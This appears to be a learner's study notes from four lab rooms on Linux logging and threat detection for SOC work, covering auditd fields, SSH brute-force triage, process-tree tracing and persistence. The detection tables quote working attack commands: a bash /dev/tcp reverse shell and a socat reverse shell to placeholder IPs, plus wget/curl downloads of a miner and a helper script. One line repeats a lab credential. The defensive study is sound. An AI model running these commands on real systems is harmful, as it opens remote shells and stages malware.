# Room 01: Linux Logging for SOC

## Objective

Understand native Linux log architectures, system authentication auditing, command-line history gaps, and runtime kernel process tracking using `auditd`.

## Key Learning Points

### Core Linux Log Files & Paths

| Log File | Path | Primary Purpose |
| :--- | :--- | :--- |
| **System Log** | `/var/log/syslog` | Aggregated system events, service states, and kernel messages (e.g., Yama) |
| **Auth Log** | `/var/log/auth.log` | SSH authentications, `sudo` commands, user account additions/deletions |
| **Package Logs** | `/var/log/dpkg.log` (or `dnf.log`/`yum.log`) | Installation, update, and removal history of system packages |
| **Nginx Log** | `/var/log/nginx/access.log` | Web server request logs (source IPs, URI paths, HTTP status codes) |
| **Audit Log** | `/var/log/audit/audit.log` | Raw runtime telemetry generated by kernel audit rules (`auditd`) |

### System Calls & `auditd` Event Telemetry
- **`execve` Syscall:** The core Linux kernel system call used to execute programs. EDRs and `auditd` monitor this call to capture full command-line execution arguments.
- **Key `auditd` Log Fields:**
  - `proctitle` / `EXECVE`: The exact command executed.
  - `pid` / `ppid`: Process ID and Parent Process ID.
  - `auid` (Audit User ID): Tracks the original logged-in user identity, preserving attribution even after `sudo su` or `su`.
  - `uid`: Effective User ID executing the command.
  - `key`: Custom audit rule tag used for fast filtering via `ausearch`.

### History Log Limitations
User-level shell history (`~/.bash_history`) is unreliable during incident response because attackers can easily bypass or clear it by prepending spaces to commands, unsetting `$HISTFILE`, executing commands inside scripts, or switching to unmonitored subshells (`/bin/sh`).

## Practical Exercise

In this lab, I parsed system logs and runtime telemetry to investigate host activity:

- **System & Auth Log Triage:** Used `grep` on `/var/log/syslog` and `/var/log/auth.log` to identify NTP time synchronization domains, kernel module security messages (Yama), SSH brute-force source IPs, and unauthorized `sudo` account additions.
- **Package & Shell Artifact Inspection:** Inspected `/var/log/dpkg.log` to confirm package installation timelines (`unzip`) and reviewed `.bash_history` files to spot interactive administrative commands.
- **Runtime Audit Inspection:** Used `ausearch -i` with custom rule keys (`file_thmsecret`, `proc_wget`) to extract file access timestamps, trace remote payload downloads via `wget`, and isolate network scanning parameters executed by a downloaded binary.

## Skills Acquired

- Navigated `/var/log` text logs using Linux CLI tools (`grep`, `cat`).
- Audited SSH authentications and `sudo` privilege escalation in `/var/log/auth.log`.
- Evaluated system calls (`execve`) and core `auditd` telemetry fields (`auid`, `ppid`).
- Formulated `ausearch` queries to filter runtime file access and process execution events.

## Interview Question

**Q: Why is the `auid` (Audit User ID) field in `auditd` logs vital during an incident investigation?**

**A:** The `auid` retains the original identity of the user who initially authenticated into the system session. Even if an attacker elevates privileges to `root` (`uid=0`) via `sudo su`, the `auid` preserves their original unprivileged user ID (e.g., `auid=1001`), ensuring reliable attribution.

## Key Takeaway

Relying on user-space command history is risky; monitoring kernel-level system calls (`execve`) via `auditd` ensures reliable execution visibility regardless of shell evasion techniques.

# Room 02: Linux Threat Detection 1

## Objective

Identify initial access vectors on Linux systems, focusing on SSH brute-forcing vs. key abuse, web application command injection, and process tree reconstruction via `auditd`.

## Key Learning Points

### Initial Access Vectors & Detection Indicators

| Access Vector | MITRE ID | Common Risk Scenarios | Primary Log Source | Key Detection Indicators |
| :--- | :--- | :--- | :--- | :--- |
| **External Remote Services (SSH)** | T1021.004 | Weak passwords, exposed keys in repos, stealer malware | `/var/log/auth.log` | Multiple `Failed password` logs followed by `Accepted password` from external IPs |
| **Exploit Public-Facing Application** | T1190 | Unfiltered input, command injection vulnerabilities | `/var/log/nginx/access.log` | OS commands embedded in HTTP URL parameters (e.g., `;whoami`, `;ls`) |
| **Supply Chain Compromise** | T1195 | Backdoored dependencies, compromised repositories | `auditd` / Process Logs | Trusted application binaries executing unexpected child commands (e.g., `wget`, `curl`) |

### Process Tree Tracing Mechanics
When an alert triggers for a suspicious binary execution (e.g., `whoami`), tracing parent-child process relationships (`PID`/`PPID`) reveals the true entry point:

```text
[System Init / Kernel (PID 1)]
              │
              ▼
   [Python Web App (PID 3898)]  <-- Vulnerable Service (Entry Point)
              │
              ▼
     [/bin/sh Shell (PID 3905)]
              │
              ▼
     [/usr/bin/whoami (PID 3907)] <-- Alerted Command

```

* **Target Command (PID 3907):** Suspicious process flagged by detection rules.
* **Parent Process (PPID 3905):** Execution subshell spawned by the application.
* **Grandparent Process (PPID 3898):** Parent web daemon identifying the initial application breach.

## Practical Exercise

In this lab, I analyzed SSH brute-force campaigns and web application exploitation:

* **SSH Authentication Analysis:** Parsed `/var/log/auth.log` using `grep` to differentiate authentication types (`publickey` vs. `password`), establish brute-force attack windows, identify targeted accounts (`root`, `roy`, `sol`), and isolate breaching external IP addresses.
* **Web Exploitation Triage:** Inspected `/var/log/nginx/access.log` to discover command injection vulnerabilities on the `/ping` endpoint targeting internal application scripts (`/opt/trypingme/main.py`).
* **Process Tree Reconstruction:** Executed `ausearch -i -x whoami` to locate initial alert events, traversed parent process IDs (`ausearch -i --pid <PPID>`) to identify the vulnerable parent web application, and used `--ppid` filters to trace spawned reverse shells and secondary payload downloads.

## Skills Acquired

* Differentiated legitimate SSH authentication from brute-force breach patterns.
* Identified command injection signatures inside web server access logs.
* Reconstructed parent-child process trees using `auditd` PIDs and PPIDs.
* Traced alerted command executions back to originating web services.

## Interview Question

**Q: Why is process tree analysis more reliable than web server logs when investigating web application compromises?**

**A:** Web server access logs only record incoming HTTP request metadata and may miss post-exploitation activity, obfuscated payloads, or zero-day exploits. Process tree analysis monitors kernel-level execution events (`execve`), enabling analysts to trace malicious commands directly back to the parent daemon regardless of how the payload was delivered.

## Key Takeaway

Investigating security alerts requires looking beyond the alerted binary; traversing the process tree upward identifies the entry vector that spawned the process.

# Room 03: Linux Threat Detection 2

## Objective

Analyze Linux post-exploitation activities, including host discovery, non-interactive malware staging, ingress tool transfers, and cryptominer campaign mechanics.

## Key Learning Points

### Post-Exploitation Discovery Commands

| Category | Commands | Security Relevance & Context |
| --- | --- | --- |
| **OS & Cloud Discovery** | `uname -a`, `hostname`, `systemd-detect-virt` | Identifies target kernel versions, architectures, and cloud providers (e.g., AWS, Azure) |
| **User & Session Auditing** | `whoami`, `id`, `w`, `last`, `cat /etc/passwd` | Checks privilege context and active sessions; `whoami` post-service breach is a high-confidence indicator |
| **Process & Defensive Check** | `ps aux`, `top`, `pgrep "<edr>"` | Searches for active security tools, EDR daemons (e.g., `ds_agent`, `falcon`), or competing miners |
| **Resource & Network Discovery** | `cat /proc/cpuinfo`, `free -m`, `ip a`, `ss -tnlp` | Evaluates hardware capacity for mining suitability and maps internal network interfaces |

### Ingress Tool Transfer Methods

| Download Mechanism | Execution Example | Forensic Log Artifact |
| --- | --- | --- |
| **Direct Download (`wget`)** | `wget https://domain.thm/miner.tar.gz -O /tmp/miner.tar.gz` | Captured in `auditd` command-line arguments (`proc_wget`) |
| **Piped Execution (`curl`)** | `curl --output /var/tmp/helper.sh http://domain.thm/helper.sh` | Recorded in process execution logs and outbound network streams |
| **Remote Transfer (`scp` / `sftp`)** | `scp malware.tar.gz victim@host:/tmp/` | No local `execve` log on victim; triggers SSH session events in `auth.log` |

### Cryptominer Infection Lifecycle

```text
[1. SSH Brute-Force] ──> [2. Discovery & EDR Check] ──> [3. Persistence & Lockout]
 (auth.log Accepted)       (last, egrep EDR daemons)      (passwd & .ssh/authorized_keys)
                                                                      │
                                                                      ▼
[5. Background Execution] <── [4. Ingress Tool Transfer] <────────────┘
 (nohup /tmp/.apt/...)       (SCP transfer of kernupd.tar.gz)

```

## Practical Exercise

In this lab, I executed discovery commands and analyzed a real-world cryptominer breach:

* **Discovery Execution & Context Analysis:** Ran system commands (`systemd-detect-virt`, `ps aux`) to spot cloud virtual environments. Used `ausearch -i --pid` to trace `hostname` execution up to its parent script (`/home/itsupport/debug.sh`) to distinguish administrative diagnostics from adversary activity.
* **Ingress Transfer Tracking:** Evaluated command history and `auditd` logs to identify file downloads (`artifacts.elastic.co`, `/var/tmp/helper.sh`) via `curl` and `wget`.
* **Dota3 Cryptominer Campaign Triage:** Analyzed authentic log files (`/home/ubuntu/scenario/`) to trace an SSH brute-force breach (`45.9.148.125`), targeted EDR checks (`ds_agent`, `falcon`, `sentinel`), SCP archive transfers (`kernupd.tar.gz`), persistent background miner binaries launched via `nohup`, and internal subnet scanning ranges (`10.10.12.1` – `10.10.12.10`).

## Skills Acquired

* Identified host, user, network, and EDR discovery commands.
* Differentiated administrative utility scripts from adversary discovery behavior.
* Tracked file downloads and ingress transfers via `wget`, `curl`, and `scp`.
* Uncovered cryptominer infection lifecycles, background execution (`nohup`), and staging directories (`/tmp`).

## Interview Question

**Q: Why won't `auditd` record a command-line process entry when an attacker uploads malware via `scp` from an external host?**

**A:** `scp` initiated from an external host executes within the attacker's local shell and transfers files directly over the target's SSH protocol daemon (`sshd`). Because no local file download binary (like `wget` or `curl`) is executed on the victim, `auditd` records no `execve` process event; the activity must be detected via `/var/log/auth.log` SSH session logs and file creation events in `/tmp`.

## Key Takeaway

Threat actors leverage global write permissions in `/tmp` and background execution commands (`nohup`) to stage payloads and maintain long-term execution without interactive shell sessions.

# Room 04: Linux Threat Detection 3

## Objective

Investigate advanced post-exploitation techniques, including reverse shell telemetry, privilege escalation validation, persistence mechanisms (Cron, Systemd, backdoors), and hypervisor targeting.

## Key Learning Points

### Reverse Shell Detection Mechanics

| Tool / Mechanism | Command Execution Example | Detection & Process Tree Signature |
| --- | --- | --- |
| **Native Bash TCP** | `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1` | Interactive `bash` shell spawned with file descriptor redirection to network IP |
| **Socat Relay** | `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr` | Binary execution of `socat` with `EXEC:` flags targeting external endpoints |
| **Python PTY Spawn** | `python3 -c '...s.connect(...);pty.spawn("bash")'` | `python3` process invoking interactive PTY allocation scripts |

### Linux Persistence Mechanisms

| Persistence Type | Target File / Directory Path | Forensic & Audit Monitoring Method |
| --- | --- | --- |
| **Cron Jobs** | `/var/spool/cron/<user>`, `/etc/cron.d/*` | Track file modifications via `auditd` (`-f /var/spool/cron`) or `crontab -e` execution |
| **Systemd Services** | `/etc/systemd/system/*.service` | Monitor creation/editing of `.service` files and `systemctl enable` execution |
| **Local Account Creation** | `/etc/passwd`, `/etc/shadow` | Inspect `/var/log/auth.log` for `useradd`/`usermod` commands granting `sudo` access |
| **SSH Key Backdoors** | `~/.ssh/authorized_keys` | Monitor file modification events via `auditd` (`-f /.ssh/authorized_keys`) |

### Privilege Escalation Attribution

Attribution is verified by evaluating `SYSCALL` records in process execution trees:

```text
[Target Command (whoami)] ──> [Root Shell (bash)] ──────> [Exploit Binary (pwnkit)] ──> [Service User Shell]
 PID: 24312 | UID: root      PID: 24310 | UID: root       PID: 24304 | UID: serviceuser  PID: 24302

```

Comparing the execution context before process invocation (`uid=serviceuser`) and after (`uid=root`) confirms a successful privilege escalation.

## Practical Exercise

In this lab, I investigated web shell escalation, privilege escalation, and multi-vector persistence:

* **Web Shell & Reverse Shell Investigation:** Analyzed command injection (`127.0.0.1 && whoami`) inside the TryPingMe application to identify the web service context (`svctrypingme`), verified reverse shell execution, and traced the originating attacker IP (`10.14.105.255`) using scenario `audit.log` telemetry.
* **Privilege Escalation & Credential Discovery:** Searched `audit.log` for keyword file searches (`grep -iR pass .`), tracked privilege escalation execution (`su root`), and identified administrative credentials exposed in `.env.local` files (`nGql1pQkGa`).
* **Persistence Artifact Recovery:** Analyzed file modification audit entries (`ausearch -i -f`) to identify backdoored Systemd services (`/etc/systemd/system/tux.service`), Cron persistence jobs (`@reboot /usr/sbin/phoenix`), unauthorized privileged user additions (`Koichi` added to `sudo`), and backdoored SSH key files (`/root/.ssh/authorized_keys`).

## Skills Acquired

* Identified reverse shell signatures (`bash -i`, `socat`, `python3`) in process logs.
* Confirmed privilege escalation by tracking `UID` transitions from unprivileged users to `root`.
* Audited Cron jobs (`/var/spool/cron`), Systemd services (`/etc/systemd/system/`), and SSH authorized keys (`~/.ssh/authorized_keys`) for persistence artifacts.
* Parsed raw `auditd` logs to locate exposed environment secrets and configuration files.

## Interview Question

**Q: How do you verify if a privilege escalation attempt was successful using `auditd` process logs?**

**A:** Inspect the `SYSCALL` records within the process execution tree. If an initial command or exploit runs under an unprivileged user context (e.g., `uid=1001` or `serviceuser`) and its immediate child process (such as a newly spawned `/bin/bash` or `su`) executes under `uid=0` (`root`), the privilege escalation attempt was successful.

## Key Takeaway

Targeted Linux intrusions use reverse shells to establish interactive access and maintain persistence across Systemd services, Cron jobs, and SSH keys to preserve access following reboots.
